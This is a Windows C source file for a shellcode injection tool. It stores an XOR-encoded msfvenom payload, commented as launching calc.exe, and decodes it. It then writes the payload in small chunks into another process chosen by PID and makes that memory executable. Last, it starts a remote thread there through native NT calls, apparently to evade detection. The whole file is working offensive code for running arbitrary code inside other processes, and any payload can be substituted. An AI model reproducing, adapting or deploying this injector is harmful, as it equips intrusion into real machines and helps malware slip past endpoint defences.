#pragma once

#include "api.h"
#include "gate.h"

#include <stdio.h>
#include <Windows.h>

#include <tlhelp32.h>
#pragma comment (lib, "crypt32.lib")

#define NT_SUCCESS(x) ((x) >= 0)

#define DEBUG

// msfvenom -p windows/x64/exec CMD=calc.exe -f raw
static unsigned char payload[] = {
	0x95, 0x66, 0xc1, 0xd9, 0x3e, 0xc6, 0xf9, 0x01, 0x6d, 0x17, 0x3d, 0xfa,
	0x5a, 0x06, 0x7a, 0x96, 0xa7, 0x77, 0x4f, 0x03, 0x23, 0x32, 0x71, 0x24,
	0x89, 0xb1, 0x58, 0xc4, 0x68, 0xd7, 0xa0, 0x53, 0x49, 0x66, 0xc9, 0x4f,
	0x9e, 0x66, 0x36, 0xb6, 0x27, 0x5d, 0x31, 0x9a, 0xd2, 0x1e, 0x19, 0x07,
	0x5d, 0x03, 0x1f, 0xad, 0x44, 0x56, 0xda, 0x37, 0x28, 0x30, 0xde, 0xd7,
	0x71, 0x5e, 0xc9, 0xec, 0x3b, 0x6f, 0x13, 0x75, 0x45, 0x7c, 0x19, 0x8a,
	0x2f, 0x2b, 0x34, 0xaa, 0xcb, 0xdd, 0xa8, 0x4f, 0xf1, 0x3f, 0x7e, 0x99,
	0xc3, 0xba, 0x8e, 0x11, 0xa1, 0xf8, 0x03, 0xc6, 0xfb, 0xd7, 0x33, 0x45,
	0xe2, 0x6e, 0x62, 0x74, 0xcf, 0xfe, 0xda, 0x57, 0x25, 0xe8, 0xb5, 0xea,
	0x90, 0x62, 0xa0, 0x8f, 0xf0, 0xe9, 0x33, 0xe0, 0x8f, 0x32, 0xcb, 0xb6,
	0x45, 0xb8, 0x12, 0x5f, 0x7d, 0xde, 0x2a, 0xc0, 0x51, 0xce, 0x37, 0xcc,
	0x82, 0x2d, 0x75, 0x25, 0x65, 0x52, 0x45, 0x7a, 0x6e, 0x8e, 0x70, 0x83,
	0x7a, 0x7f, 0x5a, 0x98, 0x47, 0xaa, 0x9c, 0x37, 0x62, 0xf5, 0x9b, 0xd2,
	0xfb, 0xdf, 0x37, 0x48, 0x68, 0xfe, 0x03, 0xb6, 0xca, 0xa6, 0x71, 0x00,
	0xbd, 0x56, 0x24, 0xea, 0x43, 0x08, 0x71, 0x9d, 0xb0, 0x67, 0x3f, 0x88,
	0x07, 0x20, 0xb2, 0xf5, 0x05, 0xd9, 0x92, 0xc4, 0x8f, 0x7f, 0x73, 0x40,
	0x30, 0x74, 0x0a, 0xb6, 0xdc, 0xc7, 0x6e, 0xfe, 0x92, 0xe8, 0x21, 0xe3,
	0xa1, 0x57, 0x28, 0xc7, 0xf1, 0x3f, 0x7e, 0xd1, 0x46, 0x32, 0x77, 0xfb,
	0xe8, 0xf8, 0xd3, 0x96, 0x31, 0x25, 0x1a, 0x8a, 0x06, 0xa9, 0xbd, 0xe8,
	0x75, 0xce, 0x24, 0x2b, 0x67, 0x56, 0xc6, 0x0d, 0x8e, 0xeb, 0xb5, 0x38,
	0x24, 0x77, 0xfd, 0x15, 0x6e, 0x46, 0xfc, 0x0a, 0xe3, 0x79, 0x28, 0x76,
	0x05, 0x9a, 0x90, 0x46, 0x7a, 0x5c, 0x2d, 0x57, 0xce, 0x77, 0x78, 0x88,
	0xb7, 0xe8, 0xa9, 0xc8, 0x7a, 0x3a, 0x4b, 0xe9, 0x94, 0x47, 0x1b, 0xd1
};

static unsigned char key[] = {
	0x69, 0x2e, 0x42, 0x3d, 0xce, 0x2e, 0x39, 0x01, 0x6d, 0x17, 0x7c, 0xab,
	0x1b, 0x56, 0x28, 0xc7, 0xf1, 0x3f, 0x7e, 0xd1, 0x46, 0x7a, 0xfa, 0x76,
	0xe9, 0xf9, 0xd3, 0x96, 0x70, 0x9f, 0x2b, 0x01
};


DWORD ConvertNtStatusToWin32Error(LONG ntstatus)
{
	DWORD oldError;
	DWORD result;
	DWORD br;
	OVERLAPPED o;

	o.Internal = ntstatus;
	o.InternalHigh = 0;
	o.Offset = 0;
	o.OffsetHigh = 0;
	o.hEvent = 0;
	oldError = GetLastError();
	GetOverlappedResult(NULL, &o, &br, FALSE);
	result = GetLastError();
	SetLastError(oldError);
	return result;
}

void PrintStatus(NTSTATUS status) {
#ifdef DEBUG
	LPCTSTR strErrorMessage = NULL;
	FormatMessage(
		FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_ARGUMENT_ARRAY | FORMAT_MESSAGE_ALLOCATE_BUFFER,
		NULL,
		ConvertNtStatusToWin32Error(status),
		0,
		(LPWSTR)&strErrorMessage,
		0,
		NULL);

	wprintf(L"[!] Error: %s\n", (LPCWSTR)strErrorMessage);
#endif
}

ULONG InjectMemory(HANDLE ProcessHandle, PVOID DestinationAddress, ULONG NumberOfBytesToWrite) {

	ULONG bytesWritten = 0;
	ULONG numberOfBytesToWrite = NumberOfBytesToWrite;
	SIZE_T chunkSize = sizeof(payload);
	PVOID ulWritten = NULL;
	PVOID lpAddress = NULL;
	SIZE_T sDataSize = sizeof(payload);

	if (NtAllocateVirtualMemory((HANDLE)-1, &lpAddress, 0, &chunkSize, MEM_COMMIT, PAGE_READWRITE) != 0x00) {

#ifdef DEBUG
		printf("[!] Failed to call NtAllocateVirtualMemory\n");
#endif

		return 8;
	}

	chunkSize = 4;

	while (numberOfBytesToWrite > 0) {
		ulWritten = NULL;

		long long int dst = ((long long int)(VOID *)DestinationAddress) + bytesWritten;

		if ((SIZE_T)numberOfBytesToWrite < chunkSize) {
			chunkSize = numberOfBytesToWrite;
		}

		for (SIZE_T i = 0; i < chunkSize; ++i)
			((PUINT8)lpAddress)[i] = payload[bytesWritten + i] ^ key[(bytesWritten + i) % sizeof(key)];

		NTSTATUS status;
		
		if (!NT_SUCCESS(status = NtWriteVirtualMemory(ProcessHandle, dst, lpAddress, (ULONG)chunkSize, &ulWritten)))
		{
			PrintStatus(status);

			return 9;
		}

		bytesWritten += (ULONG)ulWritten;
		numberOfBytesToWrite -= (ULONG)ulWritten;
	}

	return bytesWritten;
}

INT wmain(int argc, char* argv[])
{
	HANDLE hThread;
	HANDLE hUser32;

	NTSTATUS status;
	ULONG ulOldProtect;
	PVOID ulWritten = NULL;

	PVOID lpAddress = NULL;
	PVOID rpAddress = NULL;
	SIZE_T sDataSize = sizeof(payload);
	int pid = 0;
	HANDLE hProc = NULL;

	if (argc <= 1)
	{
		return 1;
	}

	pid = _wtoi(argv[1]);


	if (!InitApi()) {
#ifdef DEBUG
		printf("[!] Failed to initialize API");
#endif
		return 2;
	}


#ifdef DEBUG
	printf("Target PID = %d\n\n", pid);

	printf(
		"0x%p = encoded payload\n",
		payload
	);

#endif

	// try to open target process
	hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
		FALSE, (DWORD)pid);

	if (hProc == NULL)
	{
#ifdef DEBUG
		printf("[!] Failed to get process handle");
#endif
		return 3;
	}

#ifdef DEBUG
	printf("\n[*] Press enter to call NtAllocateVirtualMemory ");  getchar();
#endif

	if (!NT_SUCCESS(status = NtAllocateVirtualMemory(hProc, &rpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE)))
	{
#ifdef DEBUG
		printf("[!] Failed to allocate memory");
#endif
		PrintStatus(status);
		return 4;
	}

#ifdef DEBUG
	printf(
		"\n"
		"0x%p = remote shellcode addr\n",
		rpAddress
	);

#endif

#ifdef DEBUG
	printf("\n[*] Press enter to Inject memory ");  getchar();
	printf("[*] Injecting payload\n");
#endif

	if (InjectMemory(hProc, rpAddress, sizeof(payload)) != sizeof(payload))
	{
#ifdef DEBUG
		printf("[!] Failed to inject memory");
#endif
		PrintStatus(status);
		return 5;
	}

#ifdef DEBUG
	printf("\n[*] Press enter to call NtProtectVirtualMemory ");  getchar();
#endif

	ulOldProtect = 0;
	if (!NT_SUCCESS(status = NtProtectVirtualMemory(hProc, &rpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect)))
	{
#ifdef DEBUG
		printf("\n[*] Press enter to call NtCreateThreadEx ");  getchar();
#endif
		PrintStatus(status);
		return 6;
	}

	hThread = INVALID_HANDLE_VALUE;
	if (!NT_SUCCESS(status = NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProc, (LPTHREAD_START_ROUTINE)rpAddress, NULL, FALSE, NULL, NULL, NULL, NULL)))
	{
#ifdef DEBUG
		printf("[*] Calling NtWaitForSingleObject\n");
#endif
		PrintStatus(status);
		return 7;
	}

	NtWaitForSingleObject(hThread, FALSE, (PLARGE_INTEGER)-1);

	return 0x00;
}
